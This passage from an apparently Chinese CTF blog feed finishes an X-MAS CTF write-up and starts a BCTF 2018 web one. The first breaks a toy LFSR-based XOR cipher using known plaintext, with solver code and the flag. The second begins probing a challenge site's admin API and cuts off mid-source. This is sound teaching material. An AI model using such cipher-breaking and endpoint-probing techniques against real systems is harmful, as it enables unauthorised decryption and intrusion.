class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parity</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">4</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">2</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getseed</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> int(os.urandom(<span class="number">12</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LFSR</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.iv &gt;&gt; <span class="number">1</span> | (self.parity(self.iv &amp; self.key) &lt;&lt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.aux, self.iv = self.iv, self.LFSR()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_byte</span><span class="params">(self)</span>:</span></span><br><span class="line">        x = self.iv ^ self.mask</span><br><span class="line">        self.next()</span><br><span class="line">        x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">        <span class="keyword">return</span> (x &amp; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    o = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        o += chr(ord(x) ^ p.next_byte())</span><br><span class="line">    <span class="keyword">return</span> o.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = PRNG()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(encrypt(flag))</span><br></pre></td></tr></table></figure><p>flag.enc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab38abdef046216128f8ea76ccfcd38a4a8649802e95f817a2fc945dc04a966d502ef1e31d0a2d</span><br></pre></td></tr></table></figure><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>可以看到程序采用异或方式加密了 flag，而每次与 flag 异或的字节由类中的 <code>next_byte</code>方法生成。我们再看一下这个类，发现构造函数初始化了四个变量，其中 <code>iv、key、mask</code>都是根据随机字符串生成的 32 位比特流，我们无法得知，aux 这个变量初始化为 0。</p><p>我们来从头过一下 <code>next_byte</code>这个方法是怎么生成一个字节的：</p><p>把 iv 和 mask 进行异或得到 x，进行 <code>x ^= x &gt;&gt; 16</code> <code>x ^= x &gt;&gt; 8</code> 这两步，把 <code>x &amp; 255</code>结果返回，这就是生成的字节。而在这之中调用了 next 方法改变了类的 iv，而 mask 始终不变。</p><p>我们不难发现这几步操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line"><span class="keyword">return</span> x &amp; <span class="number">255</span></span><br></pre></td></tr></table></figure><p>其实就是把 x 的低 32 bit 按顺序分成四组，每组 8 个比特，四组数进行异或就是返回的结果。（不信可以拿个数试试）</p><p>我们再来看一下 iv 每次是如何改变的，next 函数就一行语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.aux, self.iv = self.iv, self.LFSR()</span><br></pre></td></tr></table></figure><p>aux我们不管，因为它没有参与任何运算。新的 iv 被 LFSR 函数的返回值赋值，看一下 LFSR 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self.iv &gt;&gt; <span class="number">1</span> | (self.parity(self.iv &amp; self.key) &lt;&lt; <span class="number">32</span>)</span><br></pre></td></tr></table></figure><p>返回了 iv 与 parity 函数返回值右移 32 位 进行或运算的结果。</p><p>我们再来看一下 parity 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">4</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">2</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> x &amp; <span class="number">1</span></span><br></pre></td></tr></table></figure><p>和前面 next_byte 的差不多，不难分析出这个 parity 实际就是把 x 的低 32 个比特之间进行异或，返回结果。当然，结果只能是 0 或1。</p><p>如果把 <code>(self.parity(self.iv &amp; self.key) &lt;&lt; 32)</code> 的结果比作 s，那么 s 两种可能，0 和 2**32。</p><p>新的 iv 是由当前的 iv 右移一位和 s 进行与操作得到的。注意这里 iv 可能是 32 位，也可能是 33 位，因为 2**32 是 33 位。</p><p>把各个函数和 iv 生成方法过了一遍，发现我们什么也不知道，已知只有密文，初始 iv ，mask，key 都是未知。但是还有一个条件，我们是知道 flag 是以<code>X-MAS{</code>开头的。这样我们可以得到 next_byte 生成的前 6 个字节，但是我们也无法还原初始 iv 和 mask，key。注意，我们只需要<strong>还原明文</strong>就可以了，不需要知道 iv，mask以及 key 。</p><p>我用一个图来说明一下字节的生成：</p><table><thead><tr><th></th><th>i[1]</th><th>i[2]</th><th>i[3]</th><th>i[4]</th><th>i[5]</th><th>i[6]</th><th>i[7]</th><th>i[8]</th></tr></thead><tbody><tr><td>xor</td><td>i[9]</td><td>i[10]</td><td>i[11]</td><td>i[12]</td><td>i[13]</td><td>i[14]</td><td>i[15]</td><td>i[16]</td></tr><tr><td>xor</td><td>i[17]</td><td>i[18]</td><td>i[19]</td><td>i[20]</td><td>i[21]</td><td>i[22]</td><td>i[23]</td><td>i[24]</td></tr><tr><td>xor</td><td>i[25]</td><td>i[26]</td><td>i[27]</td><td>i[28]</td><td>i[29]</td><td>i[30]</td><td>i[31]</td><td>i[32]</td></tr><tr><td>xor</td><td>m[1]</td><td>m[2]</td><td>m[3]</td><td>m[4]</td><td>m[5]</td><td>m[6]</td><td>m[7]</td><td>m[8]</td></tr><tr><td>xor</td><td>m[9]</td><td>m[10]</td><td>m[11]</td><td>m[12]</td><td>m[13]</td><td>m[14]</td><td>m[15]</td><td>m[16]</td></tr><tr><td>xor</td><td>m[17]</td><td>m[18]</td><td>m[19]</td><td>m[20]</td><td>m[21]</td><td>m[22]</td><td>m[23]</td><td>m[24]</td></tr><tr><td>xor</td><td>m[25]</td><td>m[26]</td><td>m[27]</td><td>m[28]</td><td>m[29]</td><td>m[30]</td><td>m[31]</td><td>m[32]</td></tr></tbody></table><p>把 xor 当成正常的加法，一列的进行异或，最终得到的八个比特就是生成的字节。其中 i[1] 代表 iv <strong>低32比特中</strong>从高到低的第 1 个比特（因为后面 iv 可能 33 个比特），m[5] 代表 mask 从高到低的第 5 个比特。</p><p>当下一次生成字节的时候，iv 因为发生了变化，变化后的 iv_new[2]—iv_new[32] 这 31 位是之前 iv[1]—iv[31] 这31 位（因为右移了一位），而 iv_new[1]是 0，可能新的 iv 有 33 位，但那个最高位并没有参与到字节的生成中，我们不需要管。此时生成字节的图是：</p><table><thead><tr><th></th><th>0</th><th>i[1]</th><th>i[2]</th><th>i[3]</th><th>i[4]</th><th>i[5]</th><th>i[6]</th><th>i[7]</th></tr></thead><tbody><tr><td>xor</td><td>i[8]</td><td>i[9]</td><td>i[10]</td><td>i[11]</td><td>i[12]</td><td>i[13]</td><td>i[14]</td><td>i[15]</td></tr><tr><td>xor</td><td>i[16]</td><td>i[17]</td><td>i[18]</td><td>i[19]</td><td>i[20]</td><td>i[21]</td><td>i[22]</td><td>i[23]</td></tr><tr><td>xor</td><td>i[24]</td><td>i[25]</td><td>i[26]</td><td>i[27]</td><td>i[28]</td><td>i[29]</td><td>i[30]</td><td>i[31]</td></tr><tr><td>xor</td><td>m[1]</td><td>m[2]</td><td>m[3]</td><td>m[4]</td><td>m[5]</td><td>m[6]</td><td>m[7]</td><td>m[8]</td></tr><tr><td>xor</td><td>m[9]</td><td>m[10]</td><td>m[11]</td><td>m[12]</td><td>m[13]</td><td>m[14]</td><td>m[15]</td><td>m[16]</td></tr><tr><td>xor</td><td>m[17]</td><td>m[18]</td><td>m[19]</td><td>m[20]</td><td>m[21]</td><td>m[22]</td><td>m[23]</td><td>m[24]</td></tr><tr><td>xor</td><td>m[25]</td><td>m[26]</td><td>m[27]</td><td>m[28]</td><td>m[29]</td><td>m[30]</td><td>m[31]</td><td>m[32]</td></tr></tbody></table><p>这个图中的 i[1] 和上一个图中的 i[1] 表示的含义完全相同，就是初始的 iv 低32比特中从高到低的第一个比特。</p><p>我们可以发现，前四行异或的结果，和上一个图中前四行异或的结果，有 <strong>7</strong> 位都是相同的，相当于结果右移了一位，在前面又补了一位。但是 mask 和 iv 的异或对应关系被打乱了。</p><p>我们可以换一种思路想，虽然我们不知道 mask 的具体 32 个比特，但是有用的只有八个比特，就是后四行异或的结果。所以我们通过已知的六个字符明文<code>X-MAS{</code>和完整密文来算出这八个比特。至于前四行异或的结果，相当于一个 LFSR，右移一位，同时前面补位。</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>我们有了明文的前六个字符<code>X-MAS{</code>以及密文，可以得到生成的前 6 个字节，我们来验证一下前面分析的是否正确。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=open(<span class="string">"flag.enc"</span>).read().decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> len(c[<span class="number">6</span>:])</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">"X-MAS&#123;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    byte.append(ord(c[i])^ord(flag[i]))</span><br><span class="line"><span class="keyword">print</span> byte</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> bin(byte[<span class="number">0</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==bin(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="keyword">print</span> i,bin(byte[<span class="number">0</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),bin(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>运行发现输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 10111011 01011101</span><br><span class="line">183 01000100 10100010</span><br></pre></td></tr></table></figure><p>程序里的 i 就是表格中后面 4 行异或的结果，是两个… 我们再调整一下，把判断条件里的 byte[0] 和 byte[1] 改成byte[1] 和 byte[2]，看看结果一样不：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=open(<span class="string">"flag.enc"</span>).read().decode(<span class="string">"hex"</span>)</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">"X-MAS&#123;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    byte.append(ord(c[i])^ord(flag[i]))</span><br><span class="line"><span class="keyword">print</span> byte                                  <span class="comment">#生成的字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> bin(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==bin(byte[<span class="number">2</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="keyword">print</span> i,bin(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),bin(byte[<span class="number">2</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 01011101 10101110</span><br><span class="line">183 10100010 01010001</span><br></pre></td></tr></table></figure><p>也是 72 和183 ，验证了我们之前的分析时正确的。</p><p>这样我们解题思路就清晰了，得到了实际有用的 “mask”,我们只需要每次移位的时候，最高位填 0 和 1 都试一下，看看哪个解密能得到正常的字符。然后填充正确的比特，循环得到全部 flag。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>我们需要得到生成第 6 个字节后的状态：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=open(<span class="string">"flag.enc"</span>).read().decode(<span class="string">"hex"</span>)</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">"X-MAS&#123;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    byte.append(ord(c[i])^ord(flag[i]))</span><br><span class="line"><span class="keyword">print</span> byte                                  <span class="comment">#生成的字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> bin(byte[<span class="number">4</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==bin(byte[<span class="number">5</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="keyword">print</span> i,bin(byte[<span class="number">4</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),bin(byte[<span class="number">5</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 11101011 01110101</span><br><span class="line">183 00010100 10001010</span><br></pre></td></tr></table></figure><p>如果选用 72 作为有效 mask，此时状态是 <code>01110101</code></p><p>写出 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#written by R1sker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">list=string.ascii_letters+string.digits+<span class="string">"_"</span>+<span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR1</span><span class="params">(iv)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> iv &gt;&gt; <span class="number">1</span> | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR0</span><span class="params">(iv)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> iv &gt;&gt; <span class="number">1</span> | (<span class="number">0</span> &lt;&lt; <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">c=open(<span class="string">"flag.enc"</span>).read().decode(<span class="string">"hex"</span>)</span><br><span class="line">flag=<span class="string">"X-MAS&#123;"</span></span><br><span class="line"></span><br><span class="line">mask=<span class="number">72</span></span><br><span class="line">s=<span class="number">0b01110101</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> c[<span class="number">6</span>:]:</span><br><span class="line">    <span class="keyword">if</span> chr(ord(j)^mask^LFSR1(s)) <span class="keyword">in</span> list:</span><br><span class="line">        s=LFSR1(s)</span><br><span class="line">        flag+=chr(ord(j)^mask^s)</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line">    <span class="keyword">elif</span> chr(ord(j)^mask^LFSR0(s)) <span class="keyword">in</span> list:</span><br><span class="line">        s=LFSR0(s)</span><br><span class="line">        flag += chr(ord(j) ^ mask ^ s)</span><br><span class="line">        <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-450e0033c231ceb1.png" alt="image.png"></p><blockquote><p>X-MAS{S4n7a_4lw4ys_g1ve5_n1c3_pr3s3n7s}</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Crypto 真好玩，滚去学 Web 了，毕竟还是一只 Web 狗。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 XCTF-BCTF SEAFARING</title>
      <link href="/2018/12/12/2018-XCTF-BCTF-SEAFARING/"/>
      <url>/2018/12/12/2018-XCTF-BCTF-SEAFARING/</url>
      
        <content type="html"><![CDATA[<p>11月打了几场线下，回来就做了做 BCTF 的题，无奈自己水平不够，题目质量也很高，做了半天还是没摸到什么门路，前端太差。</p><a id="more"></a><p>看一下 BCTF 的 Web 解题情况就了解了题的难度2333：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7dd8115fe2774196.png" alt="image.png"></p><p>由于各种事情加上摸鱼摸了一段时间，现在才来复现一下 BCTF 的题，小西师傅出的题有丶难，要好好学下前端了…</p><p>SEAFARING 这两道题，小西师傅的出题分享及 docker：<a href="http://momomoxiaoxi.com/ctf/2018/12/01/BCTF2018seafaring/" target="_blank" rel="noopener">http://momomoxiaoxi.com/ctf/2018/12/01/BCTF2018seafaring/</a></p><p>题目还在小西的服务器上开着，地址：<a href="http://ctf.momomoxiaoxi.com:9999" target="_blank" rel="noopener">http://ctf.momomoxiaoxi.com:9999</a></p><h3 id="SEAFARING1"><a href="#SEAFARING1" class="headerlink" title="SEAFARING1"></a>SEAFARING1</h3><p>做这个题的时候开始一直以为留言处有 xss，发现过滤了很多东西，发现了 <code>/admin/handle_message.php</code> 不会利用，太菜了。</p><p>其实留言处有个 bot，会访问指定的地址。而 robots.txt 中 <code>/admin/handle_message.php</code>泄露了一些 api：</p><p>admin/index.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- for-mobile-apps --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">"Seafaring Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template,</span></span></span><br><span class="line"><span class="tag"><span class="string">Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"application/x-javascript"</span>&gt;</span><span class="actionscript"> addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; setTimeout(hideURLbar, <span class="number">0</span>); &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">hideURLbar</span>(<span class="params"></span>)</span>&#123; <span class="built_in">window</span>.scrollTo(<span class="number">0</span>,<span class="number">1</span>); &#125; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- //for-mobile-apps --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"../css/bootstrap.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">media</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"../css/style.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">media</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- js --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../js/jquery-1.11.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- //js --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- FlexSlider --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"../css/flexslider.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">media</span>=<span class="string">"screen"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">"../js/jquery.flexslider.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">var</span> csrf_token = <span class="string">"ed8aa8fdd1ca7988655509779e0ab120"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="built_in">window</span>).load(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  $(<span class="string">'.flexslider'</span>).flexslider(&#123;</span></span><br><span class="line"><span class="actionscript">animation: <span class="string">"slide"</span>,</span></span><br><span class="line"><span class="actionscript">start: <span class="function"><span class="keyword">function</span><span class="params">(slider)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">  $(<span class="string">'body'</span>).removeClass(<span class="string">'loading'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">view_uid</span><span class="params">(uid)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">            type: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            url: <span class="string">"/admin/handle_message.php"</span>,</span></span><br><span class="line"><span class="actionscript">            data: &#123;<span class="string">"token"</span>: csrf_token, <span class="string">"action"</span>: <span class="string">"view_uid"</span>, <span class="string">"uid"</span>: uid&#125;,</span></span><br><span class="line"><span class="actionscript">            dataType: <span class="string">"json"</span>,</span></span><br><span 